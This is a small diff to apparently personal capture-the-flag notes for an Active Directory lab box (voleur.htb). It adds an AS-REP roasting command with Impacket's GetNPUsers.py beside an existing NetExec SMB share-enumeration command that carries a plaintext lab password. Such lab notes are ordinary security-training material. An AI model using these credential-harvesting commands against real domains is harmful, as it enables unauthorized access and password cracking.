@@ -51,6 +51,9 @@ klist
 # SMB Shares as USER
 sudo nxc smb dc.voleur.htb -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
 
+# Aserproast Users without passwords
+GetNPUsers.py -no-pass -usersfile PotADUsers.txt domain.dc/
+
 ```
 ## Bloodhound
 ```bash
